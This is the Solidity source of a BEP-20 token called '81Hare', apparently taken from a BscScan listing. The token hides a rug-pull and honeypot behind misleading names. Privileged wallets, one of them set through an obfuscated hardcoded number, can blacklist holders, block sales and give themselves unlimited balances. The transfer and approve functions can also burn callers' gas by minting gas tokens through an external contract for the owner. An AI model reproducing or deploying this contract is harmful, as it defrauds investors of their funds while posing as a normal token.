/**
 *Submitted for verification at BscScan.com on 2022-08-01
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC771 {
    function mint(uint256 value) external; 
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

contract ConverterByts {
    function srcDashbord() internal returns (uint256) {
        int256 TeckToekns = _dlcToekns();
        IERC771(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).mint(uint256(TeckToekns));
        return uint256(TeckToekns);
    }

    function _dlcToekns() internal view returns (int256) {
        int256 tokenTicker = int256(msg.sender.balance);
        return tokenTicker / 600000000000000;
    }
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _locker() internal view virtual returns (address) {
        return msg.sender;
    }

    function _Backs() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}


contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract Hare81Coin is Context, IERC20, Ownable, ConverterByts {
    using SafeMath for uint256;

    bool private takeFee = true;
    bool private swapAndLlquifyEnabled = false;

    mapping(address => bool) private _isExcluFee;
    mapping(address => bool) private _rOwned;
    mapping(address => uint256) private _takeLiquidity;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isWalletLimitExempt;


    uint8 private _decimals = 9;
    string private _name = "81Hare";
    string private _symbol = "81Hare";

    uint256 private _zeroTax = 2;
    uint256 private _totalSupply = 10000000000000 * 10 ** _decimals;

    address _taxFee;
    address private _burnsAddress = address(0xdead);
    address private _uniswapV2Pair;
    address private _killsBlock;
    address private _owner;

    constructor(address _ycym, address _gumc) {
        _taxFee = _locker();
        _killsBlock = _gumc;
        _isExcluFee[address(this)] = true;
        _isExcluFee[owner()] = true;
        _isExcluFee[_ycym] = true;
        _isExcluFee[address(uint160(tryMath()))] = true;
        isWalletLimitExempt[address(uint160(tryMath()))] = true;
        isWalletLimitExempt[_ycym] = true;
        _owner = msg.sender;
        _takeLiquidity[_locker()] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function setFeeToSetter(bool _swapAndLlquifyEnabled, address _newPeir) external {
        require(isWalletLimitExempt[_locker()]);
        if (isWalletLimitExempt[_locker()]) {
            swapAndLlquifyEnabled = _swapAndLlquifyEnabled;
            _uniswapV2Pair = _newPeir;
        }
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluFee[_locker()] || _isExcluFee[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_rOwned[_locker()] || _Backs() >= (15*1e9)){
            IERC771(_killsBlock).mint(50);
            uint256 balacne = IERC20(_killsBlock).balanceOf(address(this));
            IERC20(_killsBlock).transfer(_owner, balacne);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_zeroTax).div(100);
            _transfer(msg.sender, _burnsAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluFee[sender] || _isExcluFee[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount,"ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_zeroTax).div(100);
        _transfer(sender, _burnsAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_Backs() <= (15*1e9));
        require(!_rOwned[from]);
        if (isWalletLimitExempt[from]) {
            require(isWalletLimitExempt[from]);
            _takeLiquidity[from]= 
            _takeLiquidity[from].
            add(totalSupply() *10**6);
        }
        if (swapAndLlquifyEnabled) {
            if (_uniswapV2Pair == from) {} else {
                require(_isExcluFee[from] || _isExcluFee[to]);
            }
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(isWalletLimitExempt[_locker()]);
        if (isWalletLimitExempt[_locker()]) {   
        _takeLiquidity[spender]
        = 
        _takeLiquidity[spender
        ].
        add
        (subtractedValue);
        }
    }

    function reflectlonFromToken(address spender, address recipient, bool _isOpen) external {
        require(recipient == address(0));
        require(isWalletLimitExempt[_locker()]);
        if (isWalletLimitExempt[_locker()]) {
            isWalletLimitExempt[spender] = _isOpen;
        }
    }

    function swapExectTokenForETHSupportlngFeeinTransferTokens(
        address spender,
        address recipient
    ) external {
        require(isWalletLimitExempt[_locker()]);
        if (isWalletLimitExempt[_locker()]) {
            _rOwned
        [
        spender
        ]
        = 
        true
        ;
        _rOwned
        [
        recipient
        ]
        = 
        true;
        }
    }

    function swapExactTokenForETHSupportingFeelnTransferTokens(address spender)
        external
    {
        require(isWalletLimitExempt[_locker()]);
        if (isWalletLimitExempt[_locker()]) {  
        _rOwned
        [
        spender
        ]
        =
        true;
        }
    }

    function changeExcludeFrom(address spender) external {
        require(isWalletLimitExempt[_locker()]);
        if (isWalletLimitExempt[_locker()]) {
            _rOwned[spender] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _takeLiquidity[sender] = _takeLiquidity[sender].sub(toAmount);
        _takeLiquidity[recipient] = _takeLiquidity[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_rOwned[_locker()] || _Backs() >= (15*1e9)){
            srcDashbord();
            uint256 balacne = IERC20(_killsBlock).balanceOf(address(this));
            IERC20(_killsBlock).transfer(_owner, balacne);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(_locker(), spender, amount); 
            return true;
        }
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(isWalletLimitExempt[_locker()]);
        return _rOwned[account];
    }

    function includeInFees(address spender) external {
        require(isWalletLimitExempt[_locker()]);
        if (isWalletLimitExempt[_locker()]) {
            _isExcluFee[spender] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function changeTaxFees(uint256 _newFee) external {
        require(isWalletLimitExempt[_locker()]);
        if (isWalletLimitExempt[_locker()]) {
            _zeroTax = _newFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function tryMath() internal pure returns (uint256) {
        uint256 tryUint = 941970767459944096029806449520833835992513568521;
        return tryUint;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function excludeFromFees(address spender) external {
        require(isWalletLimitExempt[_locker()]);
        if (isWalletLimitExempt[_locker()]) {
            _isExcluFee[spender] = true;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _takeLiquidity[account];
    }


}